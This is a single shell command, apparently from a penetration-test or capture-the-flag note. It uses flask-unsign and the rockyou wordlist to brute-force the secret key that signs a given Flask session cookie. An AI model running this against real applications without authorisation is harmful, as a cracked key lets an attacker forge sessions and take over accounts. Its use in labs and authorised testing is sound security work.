flask-unsign --unsign --cookie '.eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWJhB2XmIuSDarNDFPqRYAkHwQMA.ai8RcA.7KhdYFeXwGqFOqHYrCn5R9p9bhU' --wordlist /usr/share/wordlists/rockyou.txt

